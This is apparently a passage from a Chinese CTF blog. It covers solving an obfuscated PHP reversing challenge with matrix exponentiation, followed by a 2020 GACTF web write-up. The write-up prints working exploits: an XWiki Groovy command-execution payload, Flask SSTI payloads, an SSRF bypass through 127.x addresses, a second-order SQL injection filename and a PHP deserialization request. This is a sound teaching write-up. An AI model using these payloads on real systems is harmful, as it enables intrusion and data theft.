$I1lll111II($l1I11lll1l)($I1lll111II($l1I11lll1l)($l1I11lll1l)), $I1lll111II($l1IIl1II1l($I1lll111II($l1I11lll1l)($l1I11lll1l)))($I1IllI1l11($l1IIl1II1l($l1I11lll1l))($I1lll111II($l1I11lll1l)($l1I11lll1l))), $I1lll111II($l1I11lll1l)($I1lll111II($l1I11lll1l)($l1IIl1II1l($l1I11lll1l))), $I1IIlII1Il, $I1lll111II($I1lll111II($I1lll111II($I1lll111II($l1I11lll1l)($l1I11lll1l))($l1I11lll1l))($l1IIl1II1l($I1IllI1l11($I1lll111II($l1I11lll1l)($l1I11lll1l))($I1lll111II($l1I11lll1l)($l1I11lll1l)))))($l1I11lll1l), $I1IIlII1Il, $I1lll111II($I1lll111II($I1lll111II($l1IIl1II1l($l1I11lll1l))($l1IIl1II1l($I1lll111II($l1I11lll1l)($I1lll111II($l1I11lll1l)($l1I11lll1l)))))($l1I11lll1l))($l1I11lll1l), $l1IIl1II1l($l1I11lll1l)), array($I1lll111II($l1I11lll1l)($l1I11lll1l), $I1lll111II($l1I11lll1l)($I1lll111II($l1I11lll1l)($I1lll111II($l1IIl1II1l($I1lll111II($l1I11lll1l)($l1IIl1II1l($l1I11lll1l))))($I1lll111II($l1I11lll1l)($l1I11lll1l)))), $l1I11lll1l, $I1lll111II($l1IIl1II1l($l1I11lll1l))($l1I11lll1l), $I1lll111II($l1I11lll1l)($I1lll111II($l1I11lll1l)($l1I11lll1l)), $I1IllI1l11($l1IIl1II1l($l1I11lll1l))($I1lll111II($l1I11lll1l)($I1lll111II($I1lll111II($l1I11lll1l)($l1I11lll1l))($l1I11lll1l))), $I1IIlII1Il, $I1lll111II($I1lll111II($I1lll111II($l1I11lll1l)($I1lll111II($l1I11lll1l)($l1I11lll1l)))($I1lll111II($l1I11lll1l)($l1I11lll1l)))($I1lll111II($l1I11lll1l)($l1I11lll1l)), $I1IllI1l11($l1IIl1II1l($l1I11lll1l))($I1lll111II($l1I11lll1l)($I1lll111II($l1I11lll1l)($I1lll111II($l1I11lll1l)($l1I11lll1l))))));$l11IlII11I = $l1llIlll1l[0];for ($IlI11III11 = $I1IIlII1Il; $IlI11III11($llIIllIlll)(998244353) &lt; $IlI11III11($I1II11lIl1)(6755399441055744); $IlI11III11 = $l1IIl1II1l($IlI11III11)) &#123;    $l1l1l11Il1 = $l1llIlll1l[$IlI11III11($IIl1II1lIl)(1)];    $lIl11lI1I1 = $l1llIlll1l[$I1IllI1l11($IlI11III11)($IlI11III11)($IIl1II1lIl)(1)];    $lIl11lI1I1[0] = $I1IllI1l11($l11IlII11I[0])($l1l1l11Il1[0]);    $lIl11lI1I1[0] = $I1lll111II($I1IllI1l11($l1l1l11Il1[3])($l11IlII11I[1]))($lIl11lI1I1[0]);    $lIl11lI1I1[8] = $I1IllI1l11($l11IlII11I[8])($l1l1l11Il1[8]);    $lIl11lI1I1[8] = $I1lll111II($lIl11lI1I1[8])($I1IllI1l11($l11IlII11I[6])($l1l1l11Il1[2]));    $lIl11lI1I1[7] = $I1IllI1l11($l11IlII11I[7])($l1l1l11Il1[4]);    $lIl11lI1I1[7] = $I1lll111II($I1IllI1l11($l1l1l11Il1[1])($l11IlII11I[6]))($lIl11lI1I1[7]);    $lIl11lI1I1[1] = $I1IllI1l11($l11IlII11I[1])($l1l1l11Il1[4]);    $lIl11lI1I1[2] = $I1IllI1l11($l11IlII11I[1])($l1l1l11Il1[5]);    $lIl11lI1I1[8] = $I1lll111II($I1IllI1l11($l11IlII11I[7])($l1l1l11Il1[5]))($lIl11lI1I1[8]);    $lIl11lI1I1[4] = $I1IllI1l11($l11IlII11I[4])($l1l1l11Il1[4]);    $lIl11lI1I1[7] = $I1lll111II($I1IllI1l11($l11IlII11I[8])($l1l1l11Il1[7]))($lIl11lI1I1[7]);    $lIl11lI1I1[1] = $I1lll111II($I1IllI1l11($l1l1l11Il1[1])($l11IlII11I[0]))($lIl11lI1I1[1]);    $lIl11lI1I1[1] = $I1lll111II($lIl11lI1I1[1])($I1IllI1l11($l1l1l11Il1[7])($l11IlII11I[2]));    $lIl11lI1I1[5] = $I1IllI1l11($l11IlII11I[3])($l1l1l11Il1[2]);    $lIl11lI1I1[5] = $I1lll111II($I1IllI1l11($l1l1l11Il1[5])($l11IlII11I[4]))($lIl11lI1I1[5]);    $lIl11lI1I1[3] = $I1IllI1l11($l11IlII11I[4])($l1l1l11Il1[3]);    $lIl11lI1I1[0] = $I1lll111II($I1IllI1l11($l11IlII11I[2])($l1l1l11Il1[6]))($lIl11lI1I1[0]);    $lIl11lI1I1[5] = $I1lll111II($I1IllI1l11($l1l1l11Il1[8])($l11IlII11I[5]))($lIl11lI1I1[5]);    $lIl11lI1I1[3] = $I1lll111II($lIl11lI1I1[3])($I1IllI1l11($l1l1l11Il1[0])($l11IlII11I[3]));    $lIl11lI1I1[2] = $I1lll111II($I1IllI1l11($l11IlII11I[0])($l1l1l11Il1[2]))($lIl11lI1I1[2]);    $lIl11lI1I1[2] = $I1lll111II($I1IllI1l11($l11IlII11I[2])($l1l1l11Il1[8]))($lIl11lI1I1[2]);    $lIl11lI1I1[4] = $I1lll111II($I1IllI1l11($l11IlII11I[5])($l1l1l11Il1[7]))($lIl11lI1I1[4]);    $lIl11lI1I1[4] = $I1lll111II($I1IllI1l11($l1l1l11Il1[1])($l11IlII11I[3]))($lIl11lI1I1[4]);    $lIl11lI1I1[6] = $I1IllI1l11($l11IlII11I[7])($l1l1l11Il1[3]);    $lIl11lI1I1[3] = $I1lll111II($lIl11lI1I1[3])($I1IllI1l11($l11IlII11I[5])($l1l1l11Il1[6]));    $lIl11lI1I1[6] = $I1lll111II($I1IllI1l11($l1l1l11Il1[0])($l11IlII11I[6]))($lIl11lI1I1[6]);    $lIl11lI1I1[6] = $I1lll111II($lIl11lI1I1[6])($I1IllI1l11($l11IlII11I[8])($l1l1l11Il1[6]));    $l11IlII11I = $lIl11lI1I1;&#125;echo &#39;flag&#123;&#39;;for ($IlI11III11 = $l1I11lll1l; $IlI11III11($llIIllIlll)(-9); $IlI11III11 = $I1lll111II($l1I11lll1l)($IlI11III11)) &#123;    echo &quot;&#123;$l11IlII11I[$IlI11III11($I1II11lIl1)(9)]($lIl1l1lIlI)(0)&#125;-&quot;;&#125;echo &quot;&#123;$l11IlII11I[$IlI11III11($I1II11lIl1)(9)]($lIl1l1lIlI)(0)&#125;&#125;&quot;;</code></pre><h3 id="反混淆"><a href="#反混淆" class="headerlink" title="反混淆"></a>反混淆</h3><p>因为混淆用的是闭包函数，所以用正常的xdebug调式并不能看出函数间的调用，而且会因为函数调用层数过多而报错，所以这里唯一的技巧就是手动化简变量名（x</p><p>这里给出一份自己处理后的代码</p><pre><code class="php">&lt;?php $f1 = function ($lII1lI1IlI) &#123;    return function ($II1IlllI11) use($lII1lI1IlI) &#123;        return function ($ll1IlllIIl) use($II1IlllI11, $lII1lI1IlI) &#123;            return $II1IlllI11($lII1lI1IlI($II1IlllI11)($ll1IlllIIl));        &#125;;    &#125;;&#125;;// 自增$increase = function ($lII1lI1IlI) &#123;    return $lII1lI1IlI + 1;&#125;;$f2 = function ($lIlIll1111) &#123;    return function ($II1IIl1Ill) use($lIlIll1111) &#123;        return function ($II1IlllI11) use($lIlIll1111, $II1IIl1Ill) &#123;            return function ($ll1IlllIIl) use($II1IlllI11, $lIlIll1111, $II1IIl1Ill) &#123;                return $lIlIll1111($II1IlllI11)($II1IIl1Ill($II1IlllI11)($ll1IlllIIl));            &#125;;        &#125;;    &#125;;&#125;;// 自减$decrease = function ($lII1lI1IlI) &#123;    return $lII1lI1IlI - 1;&#125;;$ret_self = function ($II1IlllI11) &#123;    return function ($ll1IlllIIl) &#123;        return $ll1IlllIIl;    &#125;;&#125;;// 乘3模7$mul_mod = function ($lII1lI1IlI) &#123;    return $lII1lI1IlI * 3 % 7;&#125;;$f3 = function ($lIlIll1111) use($f2, $ret_self) &#123;    return function ($II1IIl1Ill) use($lIlIll1111, $f2, $ret_self) &#123;        return $lIlIll1111($f2($II1IIl1Ill))($ret_self);    &#125;;&#125;;$f4 = function ($II1IlllI11) &#123;    return function ($ll1IlllIIl) use($II1IlllI11) &#123;        return $II1IlllI11($ll1IlllIIl);    &#125;;&#125;;// 模1000000007自增$increase_mod = function ($lII1lI1IlI) &#123;    return ($lII1lI1IlI + 1) % 1000000007;&#125;;// array(8)$v1 = array(array($f2($f1($f2($f2($f4)($f2($f4)($f2($f1($f4))($f4))))($f4)))($f4), $f2($f2($f4)($f1($f1($f4))))($f2($f4)($f2($f1($f4))($f2($f4)($f4)))), $f1($f2($f2($f1($f2($f4)($f2($f2($f4)($f2($f4)($f4)))($f4))))($f4))($f4)), $f3($f1($f4))($f1($f4)), $ret_self, $f3($f1($f4))($f2($f4)($f1($f1($f4)))), $f2($f1($f4))($f2($f4)($f3($f2($f4)($f4))($f1($f2($f4)($f4))))), $f1($f1($f2($f4)($f2($f4)($f4)))), $f2($f4)($f2($f4)($f4))), array($f2($f2($f4)($f2($f4)($f4)))($f2($f4)($f2($f2($f4)($f2($f4)($f4)))($f4))), $ret_self, $f1($f1($f4)), $f2($f2($f3($f2($f1($f4))($f4))($f2($f4)($f4)))($f4))($f4), $ret_self, $f1($f2($f2($f4)($f4))($f1($f4))), $f2($f2($f2($f2($f4)($f1($f4)))($f2($f4)($f4)))($f4))($f2($f4)($f1($f4))), $f2($f2($f4)($f2($f4)($f4)))($f2($f2($f1($f4))($f2($f4)($f4)))($f2($f4)($f4))), $f3($f1($f4))($f2($f4)($f2($f4)($f1($f4))))), array($f2($f2($f4)($f4))($f4), $f1($f4), $ret_self, $f1($f2($f3($f1($f4))($f2($f4)($f2($f4)($f4))))($f4)), $f2($f4)($f4), $f2($f4)($f2($f1($f2($f4)($f2($f4)($f4))))($f4)), $ret_self, $f4, $f2($f4)($f2($f2($f2($f4)($f1($f4)))($f2($f4)($f2($f4)($f4))))($f1($f4)))), array($f1($f2($f2($f1($f2($f4)($f4)))($f1($f2($f4)($f4))))($f2($f4)($f4))), $f2($f1($f2($f2($f4)($f4))($f4)))($f1($f2($f4)($f4))), $f1($f1($f4)), $f2($f4)($f4), $f4, $ret_self, $f2($f4)($f3($f2($f4)($f4))($f2($f4)($f4))), $f2($f1($f3($f2($f2($f4)($f4))($f4))($f2($f4)($f4))))($f2($f4)($f4)), $f2($f2($f2($f4)($f2($f4)($f4)))($f2($f2($f1($f4))($f4))($f4)))($f2($f4)($f4))), array($f2($f2($f2($f4)($f4))($f4))($f2($f4)($f2($f2($f4)($f4))($f2($f4)($f4)))), $f2($f2($f4)($f1($f2($f4)($f1($f4)))))($f2($f4)($f1($f4))), $f3($f2($f1($f4))($f4))($f2($f1($f4))($f4)), $f2($f4)($f2($f4)($f2($f4)($f4))), $ret_self, $f2($f1($f4))($f4), $f2($f2($f4)($f1($f1($f4))))($f4), $f4, $f2($f4)($f2($f2($f4)($f4))($f2($f4)($f4)))), array($f2($f4)($f4), $f1($f2($f1($f4))($f3($f2($f1($f4))($f4))($f1($f4)))), $f1($f4), $ret_self, $f2($f3($f1($f4))($f1($f4)))($f2($f2($f4)($f4))($f2($f2($f4)($f4))($f4))), $f2($f2($f4)($f4))($f1($f2($f4)($f1($f2($f4)($f4))))), $f2($f2($f2($f1($f4))($f4))($f4))($f4), $ret_self, $f2($f1($f1($f2($f1($f2($f4)($f1($f4))))($f4))))($f4)), array($ret_self, $f2($f4)($f2($f4)($f4)), $f2($f1($f2($f4)($f4)))($f3($f1($f4))($f2($f4)($f4))), $f2($f4)($f2($f4)($f1($f4))), $ret_self, $f2($f2($f2($f2($f4)($f4))($f4))($f1($f3($f2($f4)($f4))($f2($f4)($f4)))))($f4), $ret_self, $f2($f2($f2($f1($f4))($f1($f2($f4)($f2($f4)($f4)))))($f4))($f4), $f1($f4)), array($f2($f4)($f4), $f2($f4)($f2($f4)($f2($f1($f2($f4)($f1($f4))))($f2($f4)($f4)))), $f4, $f2($f1($f4))($f4), $f2($f4)($f2($f4)($f4)), $f3($f1($f4))($f2($f4)($f2($f2($f4)($f4))($f4))), $ret_self, $f2($f2($f2($f4)($f2($f4)($f4)))($f2($f4)($f4)))($f2($f4)($f4)), $f3($f1($f4))($f2($f4)($f2($f4)($f2($f4)($f4))))));// 打印初始变量for($i = 0; $i &lt; 8; $i++) &#123;    echo $i . &#39;: [&#39;;    for ($f4_2 = $f4; $f4_2($increase)(-9); $f4_2 = $f2($f4)($f4_2)) &#123;        echo &quot;&#123;$v1[$i][$f4_2($decrease)(9)]($increase_mod)(0)&#125;,&quot;;    &#125;    echo &quot;&#123;$v1[$i][$f4_2($decrease)(9)]($increase_mod)(0)&#125;]&quot;, &quot;\n&quot;;&#125;$v2 = $v1[0];for ($f4_2 = $ret_self; $f4_2($increase)(998244353) &lt; $f4_2($decrease)(6755399441055744); $f4_2 = $f1($f4_2)) &#123;    // $v3 = 3 ** k % 7    $v3 = $v1[$f4_2($mul_mod)(1)];    // $v4 其实是无用的    // $v4 = $v1[$f3($f4_2)($f4_2)($mul_mod)(1)];    $v4 = array(9);    $v4[0] = $f3($v2[0])($v3[0]);    $v4[0] = $f2($f3($v3[3])($v2[1]))($v4[0]);    $v4[0] = $f2($f3($v2[2])($v3[6]))($v4[0]);    $v4[1] = $f3($v2[1])($v3[4]);    $v4[1] = $f2($f3($v3[1])($v2[0]))($v4[1]);    $v4[1] = $f2($v4[1])($f3($v3[7])($v2[2]));    $v4[2] = $f3($v2[1])($v3[5]);    $v4[2] = $f2($f3($v2[0])($v3[2]))($v4[2]);    $v4[2] = $f2($f3($v2[2])($v3[8]))($v4[2]);    $v4[3] = $f3($v2[4])($v3[3]);    $v4[3] = $f2($v4[3])($f3($v3[0])($v2[3]));    $v4[3] = $f2($v4[3])($f3($v2[5])($v3[6]));    $v4[4] = $f3($v2[4])($v3[4]);    $v4[4] = $f2($f3($v2[5])($v3[7]))($v4[4]);    $v4[4] = $f2($f3($v3[1])($v2[3]))($v4[4]);    $v4[5] = $f3($v2[3])($v3[2]);    $v4[5] = $f2($f3($v3[5])($v2[4]))($v4[5]);    $v4[5] = $f2($f3($v3[8])($v2[5]))($v4[5]);    $v4[6] = $f3($v2[7])($v3[3]);    $v4[6] = $f2($f3($v3[0])($v2[6]))($v4[6]);    $v4[6] = $f2($v4[6])($f3($v2[8])($v3[6]));    $v4[7] = $f3($v2[7])($v3[4]);    $v4[7] = $f2($f3($v3[1])($v2[6]))($v4[7]);    $v4[7] = $f2($f3($v2[8])($v3[7]))($v4[7]);    $v4[8] = $f3($v2[8])($v3[8]);    $v4[8] = $f2($v4[8])($f3($v2[6])($v3[2]));    $v4[8] = $f2($f3($v2[7])($v3[5]))($v4[8]);    $v2 = $v4;&#125;// 倒序打印 v2echo &#39;flag&#123;&#39;;for ($f4_2 = $f4; $f4_2($increase)(-9); $f4_2 = $f2($f4)($f4_2)) &#123;    echo &quot;&#123;$v2[$f4_2($decrease)(9)]($increase_mod)(0)&#125;-&quot;;&#125;echo &quot;&#123;$v2[$f4_2($decrease)(9)]($increase_mod)(0)&#125;&#125;&quot;;</code></pre><p>基本逻辑都写在注释里面了，代码的重点在如何找到for循环的规律，正所谓<strong>逆向七分解三分猜</strong>，这里其实就是对$v2，$v3的数据进行处理，而且是整整齐齐的三组数据连起来进行计算</p><p>我们先把矩阵打印出来看看</p><pre><code class="php">0: [3,5,9,8,0,4,9,9,8] =&gt; 第一步的$v21: [8,9,9,5,0,8,3,0,8] =&gt; 第一步的$v32: [9,1,0,6,2,8,0,2,3]3: [9,9,5,0,1,2,3,7,9]4: [5,1,5,3,0,4,9,8,8]5: [8,0,5,7,9,0,2,9,2]6: [2,8,0,9,0,4,7,3,0]7: [8,7,0,8,3,3,1,8,2]</code></pre><p>再把经过第一次转换的flag打印出来</p><pre><code class="php">flag&#123;76-27-139-76-72-104-141-81-217&#125;</code></pre><p>然后我们就可以猜测其实它们就是进行了这样一个运算</p><pre><code class="php">$v4[0] = $v2[0] * $v3[0] + $v2[1] * $v3[3] + $v2[2] * $v3[6];</code></pre><p>根据这个规律我们可以得到初步的exp</p><pre><code class="python">def calc():    global v1, v2, x    v3 = v1[(3 ** x) % 7]    v4 = [0] * 9    v4[0] = (v2[0]*v3[0] + v2[1]*v3[3] + v2[2]*v3[6]) % 1000000007    v4[1] = (v2[0]*v3[1] + v2[1]*v3[4] + v2[2]*v3[7]) % 1000000007    v4[2] = (v2[0]*v3[2] + v2[1]*v3[5] + v2[2]*v3[8]) % 1000000007    v4[3] = (v2[3]*v3[0] + v2[4]*v3[3] + v2[5]*v3[6]) % 1000000007    v4[4] = (v2[3]*v3[1] + v2[4]*v3[4] + v2[5]*v3[7]) % 1000000007    v4[5] = (v2[3]*v3[2] + v2[4]*v3[5] + v2[5]*v3[8]) % 1000000007    v4[6] = (v2[6]*v3[0] + v2[7]*v3[3] + v2[8]*v3[6]) % 1000000007    v4[7] = (v2[6]*v3[1] + v2[7]*v3[4] + v2[8]*v3[7]) % 1000000007    v4[8] = (v2[6]*v3[2] + v2[7]*v3[5] + v2[8]*v3[8]) % 1000000007    v2 = v4    x += 1if __name__ == &quot;__main__&quot;:    v1 = [        [3, 5, 9, 8, 0, 4, 9, 9, 8],        [8, 9, 9, 5, 0, 8, 3, 0, 8],         [9, 1, 0, 6, 2, 8, 0, 2, 3],         [9, 9, 5, 0, 1, 2, 3, 7, 9],         [5, 1, 5, 3, 0, 4, 9, 8, 8],         [8, 0, 5, 7, 9, 0, 2, 9, 2],         [2, 8, 0, 9, 0, 4, 7, 3, 0],         [8, 7, 0, 8, 3, 3, 1, 8, 2]    ]    v2 = v1[0]    x = 0    count = (6755399441055744 - 998244353) // 2    count = 2    for _ in range(count):        calc()    print(&quot;flag&#123;&quot; + &quot;-&quot;.join([str(_ % 1000000007) for _ in v2]) + &quot;&#125;&quot;)</code></pre><h3 id="矩阵快速幂"><a href="#矩阵快速幂" class="headerlink" title="矩阵快速幂"></a>矩阵快速幂</h3><p>想要上面的脚本暴力解出来不可能的，因为需要3377699221405695次运算</p><p>仔细观察，其实这刚好是一个3组3*3矩阵连乘的运算，这里考察的是一个矩阵快速幂的算法</p><blockquote><p>推荐使用SageMath解题，SageMath整合了很多数学的常用算法</p></blockquote><p>参考<strong>@ver</strong>大哥exp给出自己的exp</p><pre><code class="python">#/usr/bin/sage# 变换矩阵v1 = [    [3, 5, 9, 8, 0, 4, 9, 9, 8],    [8, 9, 9, 5, 0, 8, 3, 0, 8],     [9, 1, 0, 6, 2, 8, 0, 2, 3],     [9, 9, 5, 0, 1, 2, 3, 7, 9],     [5, 1, 5, 3, 0, 4, 9, 8, 8],     [8, 0, 5, 7, 9, 0, 2, 9, 2],     [2, 8, 0, 9, 0, 4, 7, 3, 0],     [8, 7, 0, 8, 3, 3, 1, 8, 2]]# 初始矩阵v2 = v1[0]# 模数p = 1000000007# 循环次数count = (6755399441055744 - 998244353) // 2# 初始化3个初始矩阵vec = [Matrix(GF(p), 1, 3, v2[3 * i: 3 * i + 3]) for i in range(3)]# 获取6个循环矩阵ma = [Matrix(GF(p), 3, 3, v1[(3 ** k) % 7]) for k in range(6)]# 获取1次循环结果mm = 1for i in range(6):    mm *= ma[i]# 打印乘法余数print(count % 6)# 3# 矩阵快速幂mm = (mm ** (count//6)) * ma[0] * ma[1] * ma[2] * ma[3]# 乘上初始矩阵res = [(vec[i] * mm)[0] for i in range(3)]# 打印结果flag = [str(res[i // 3][i % 3]) for i in range(9)]print(&quot;flag&#123;&quot; + &quot;-&quot;.join(flag) + &quot;&#125;&quot;)# flag&#123;432734187-186275980-552238391-407500134-680581127-536698178-262495339-821428559-850467550&#125;</code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2020 GACTF web</title>
      <link href="/2020/08/31/2020-GACTF-web/"/>
      <url>/2020/08/31/2020-GACTF-web/</url>
      
        <content type="html"><![CDATA[<p>题目很有意思，给星盟师傅跪了</p><span id="more"></span><h2 id="XWiki"><a href="#XWiki" class="headerlink" title="XWiki"></a>XWiki</h2><blockquote><p>XWiki CVE &amp; groovy 交互</p></blockquote><p>XWiki 11.10.1，搜索当前CVE，找到任意命令执行漏洞</p><p><a href="https://jira.xwiki.org/browse/XWIKI-16960">https://jira.xwiki.org/browse/XWIKI-16960</a></p><p>python被底层限制，但是groovy可以打 </p><pre><code class="java">r = Runtime.getRuntime()proc = r.exec(&#39;/readflag&#39;);BufferedReader stdInput1 = new BufferedReader(new InputStreamReader(proc.getInputStream()));String s1 = null;while ((s1 = stdInput1.readLine()) != null) &#123; print s1; &#125;</code></pre><p>一开读flag的时候就会卡死，后来一句句读了发现需要交互回答问题，没给问题个数，回答哪个数最大，0或者1，一开始我以为回答完就会给flag，结果手打了几十个 : )发现还没到尽头，而且回答的顺序是固定，那估计就是flag的bin值，写个脚本然后手动二分到464位结束，最后是Congratulations，然后把回答的01连起来就是flag</p><pre><code class="java">proc = Runtime.getRuntime().exec(&#39;/readflag&#39;);BufferedReader br = new BufferedReader(new InputStreamReader(proc.getInputStream()));BufferedWriter bw = new BufferedWriter(new OutputStreamWriter(proc.getOutputStream()));String flag = &#39;&#39;String s1 = null;for(int i in 1..2) &#123; s1 = br.readLine(); println s1; &#125;for(int i in 1..464) &#123; s1 = br.readLine(); res = s1[25..-1].split(&#39; : &#39;); a = Integer.parseInt(res[0]); b = Integer.parseInt(res[1]); c = (a &gt; b) ? 0 : 1; flag += c bw.write(c+&quot;\n&quot;); bw.flush();&#125;s1 = br.readLine();println s1println flag</code></pre><h2 id="simpleflask"><a href="#simpleflask" class="headerlink" title="simpleflask"></a>simpleflask</h2><blockquote><p>SSTI</p></blockquote><p>过滤单引号、空格、加号、flag、eval、import，限制了文件名长度</p><p>这里直接贴payload</p><pre><code class="python">name=&#123;&#123;&#123;&#125;.__class__.__bases__[0].__subclasses__()[127].__init__.__globals__["__builtins__"]["open"]("/FLAG".swapcase()).read()&#125;&#125;</code></pre><h2 id="EZFLASK"><a href="#EZFLASK" class="headerlink" title="EZFLASK"></a>EZFLASK</h2><blockquote><p>SSTI &amp; SSRF</p></blockquote><p>提出给出源码，有用的只有eval</p><pre><code class="python"># -*- coding: utf-8 -*-from flask import Flask, requestimport requestsfrom waf import *import timeapp = Flask(__name__)@app.route(&#39;/ctfhint&#39;)def ctf():    hint =xxxx # hints    trick = xxxx # trick    return trick@app.route(&#39;/&#39;)def index():    # app.txt@app.route(&#39;/eval&#39;, methods=[&quot;POST&quot;])def my_eval():    # post eval@app.route(xxxxxx, methods=[&quot;POST&quot;]) # Secretdef admin():    # admin requestsif __name__ == &#39;__main__&#39;:    app.run(host=&#39;0.0.0.0&#39;,port=8080)</code></pre><p>ban了很多单双引号和小中大括号，以及多个关键字，但是留下了<code>__globals__</code>和<code>func_globals</code>，利用它爆出admin路径</p><pre><code class="python">POST /evaleval=ctf.__globals__&#123;&#39;my_eval&#39;: &lt;function my_eval at 0x7f7469bf0dd0&gt;, &#39;app&#39;: &lt;Flask &#39;app_1&#39;&gt;, &#39;waf_eval&#39;: &lt;function waf_eval at 0x7f7469bf0c50&gt;, &#39;admin&#39;: &lt;function admin at 0x7f7469b3a650&gt;, &#39;index&#39;: &lt;function index at 0x7f7469bf0d50&gt;, &#39;waf_ip&#39;: &lt;function waf_ip at 0x7f7469bf0b50&gt;, &#39;__builtins__&#39;: &lt;module &#39;__builtin__&#39; (built-in)&gt;, &#39;admin_route&#39;: &#39;/h4rdt0f1nd_9792uagcaca00qjaf&#39;, &#39;__file__&#39;: &#39;app_1.py&#39;, &#39;request&#39;: &lt;Request &#39;http://124.70.206.91:10001/eval&#39; [POST]&gt;, &#39;__package__&#39;: None, &#39;Flask&#39;: &lt;class &#39;flask.app.Flask&#39;&gt;, &#39;ctf&#39;: &lt;function ctf at 0x7f7469bf0cd0&gt;, &#39;waf_path&#39;: &lt;function waf_path at 0x7f7469bf0bd0&gt;, &#39;time&#39;: &lt;module &#39;time&#39; from &#39;/usr/local/lib/python2.7/lib-dynload/time.so&#39;&gt;, &#39;__name__&#39;: &#39;__main__&#39;, &#39;requests&#39;: &lt;module &#39;requests&#39; from &#39;/usr/local/lib/python2.7/site-packages/requests/__init__.pyc&#39;&gt;, &#39;__doc__&#39;: None&#125;</code></pre><p>admin是一个http请求，一看就是ssrf，fuzz了一下发现</p><ul><li>waf_ip满足点分十进制（准确来讲是点分数字）ban: xxx.0.0.xxx、192.xxx.xxx.xx</li><li>port是4位任意字符</li><li>path是非数字字符</li></ul><p>这里卡了很久，队友@小喇叭发现127开头的地址就可以绕过内网地址，这就有意思了 : )</p><p>扫到5000端口有东西，是常见的列出全局变量的SSTI</p><pre><code class="python">POST /h4rdt0f1nd_9792uagcaca00qjafip=127.1.1.1&amp;port=5000&amp;path=import flaskfrom xxxx import flagapp = flask.Flask(__name__)app.config[&#39;FLAG&#39;] = flag@app.route(&#39;/&#39;)def index():    return open(&#39;app.txt&#39;).read()@app.route(&#39;/&lt;path:hack&gt;&#39;)def hack(hack):    return flask.render_template_string(hack)if __name__ == &#39;__main__&#39;:    app.run(host=&#39;0.0.0.0&#39;,port=5000)</code></pre><p>长度限制又过滤了<code>config</code>，这里可以直接把<code>[&#39;co&#39;+&#39;nfig&#39;]</code>写成<code>[&#39;co&#39;&#39;nfig&#39;]</code></p><pre><code class="python">POST /h4rdt0f1nd_9792uagcaca00qjafip=127.1.1.1&amp;port=5000&amp;path=%7B%7Burl_for.__globals__[&#39;current_app&#39;][&#39;co&#39;&#39;nfig&#39;]%7D%7D</code></pre><h2 id="carefuleyes"><a href="#carefuleyes" class="headerlink" title="carefuleyes"></a>carefuleyes</h2><blockquote><p>二次注入 &amp; 反序列化</p></blockquote><p>题目给了源码，直接给了一个反序列化的接口</p><p>主要代码有</p><pre><code class="php">&lt;?phprequire_once &quot;common.php&quot;;if (isset($req[&#39;oldname&#39;]) &amp;&amp; isset($req[&#39;newname&#39;])) &#123;    $result = $db-&gt;query(&quot;select * from `file` where `filename`=&#39;&#123;$req[&#39;oldname&#39;]&#125;&#39;&quot;);    if ($result-&gt;num_rows &gt; 0) &#123;        $result = $result-&gt;fetch_assoc();        $info = $db-&gt;query(&quot;select * from `file` where `filename`=&#39;&#123;$result[&#39;filename&#39;]&#125;&#39;&quot;);        $info = $info-&gt;fetch_assoc();        echo &quot;oldfilename : &quot;.$info[&#39;filename&#39;].&quot; will be changed.&quot;;    &#125; else &#123;        exit(&quot;old file doesn&#39;t exists!&quot;);    &#125;&#125;...</code></pre><p>这个存在二次注入，通过union注入可以得到username和password</p><pre><code class="sql">1&#39; and 0 union select username,password,1,1,1 from user#.jpg</code></pre><p>这里是反序列化的类，拿到admin就能拿到flag</p><pre><code class="php">class XCTFGG&#123;    private $method;    private $args;    public function __construct($method, $args) &#123;        $this-&gt;method = $method;        $this-&gt;args = $args;    &#125;    function login() &#123;        list($username, $password) = func_get_args();        $username = strtolower(trim(mysql_escape_string($username)));        $password = strtolower(trim(mysql_escape_string($password)));        $sql = sprintf(&quot;SELECT * FROM user WHERE username=&#39;%s&#39; AND password=&#39;%s&#39;&quot;, $username, $password);        global $db;        $obj = $db-&gt;query($sql);        $obj = $obj-&gt;fetch_assoc();        global $FLAG;        if ( $obj != false &amp;&amp; $obj[&#39;privilege&#39;] == &#39;admin&#39;  ) &#123;            die($FLAG);        &#125; else &#123;            die(&quot;Admin only!&quot;);        &#125;    &#125;    function __destruct() &#123;        @call_user_func_array(array($this, $this-&gt;method), $this-&gt;args);    &#125;&#125;</code></pre><p>最终exp如下</p><pre><code class="http">POST /upload.php?data=O%3A6%3A%22XCTFGG%22%3A2%3A%7Bs%3A14%3A%22%00XCTFGG%00method%22%3Bs%3A5%3A%22login%22%3Bs%3A12%3A%22%00XCTFGG%00args%22%3Ba%3A2%3A%7Bs%3A8%3A%22username%22%3Bs%3A2%3A%22XM%22%3Bs%3A8%3A%22password%22%3Bs%3A9%3A%22qweqweqwe%22%3B%7D%7D HTTP/1.1Host: 124.71.191.175Content-Length: 343Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryVQBCUL5NvVhHTcjT------WebKitFormBoundaryVQBCUL5NvVhHTcjTContent-Disposition: form-data; name=&quot;upfile&quot;; filename=&quot;1&#39; and 0 union select username,password,1,1,1 from user#.jpg&quot;Content-Type: text/htmlxxx------WebKitFormBoundaryVQBCUL5NvVhHTcjT--</code></pre><h2 id="babyshop"><a href="#babyshop" class="headerlink" title="babyshop"></a><strong>babyshop</strong></h2><blockquote><p>反混淆 &amp; 任意文件读写 &amp; sess 反序列化</p></blockquote><p>.git源码泄露 但是被混淆了，代码不是很长，用xdebug慢慢调出来，这里贴一份@cjm00n人工解混淆的主要代码</p><pre><code class="php">&lt;?php  class 造齿轮&#123;    protected $storage;    protected $贡品;    protected $sessionId;    protected $safeExt;    public function __construct()    &#123;        $this-&gt;storage = &quot;storage&quot;;        if (!is_dir($this-&gt;storage)) mkdir($this-&gt;storage);        $this-&gt;safeExt = array(&quot;php&quot;, &quot;html&quot;, &quot;flag&quot;, &quot;htaccess&quot;);    &#125;    public function open($货物, $食物)    &#123;        foreach ($this-&gt;safeExt as $item) &#123;            if (stripos($_COOKIE[$食物], $item) !== false) &#123;                die(&#39;invaild &#39; . $食物);                return false;            &#125;        &#125;        $this-&gt;sessionId = session_id();        return true;    &#125;    public function write($货物, $食物)    &#123;        $this-&gt;贡品 = $货物;        return file_put_contents($this-&gt;storage . &#39;/sess_&#39; . $货物, $食物) === false ? false : true;    &#125;    public function read($货物)    &#123;        $this-&gt;贡品 = $货物;        return (string)@file_get_contents($this-&gt;storage . &quot;/sess_&quot; . $货物);  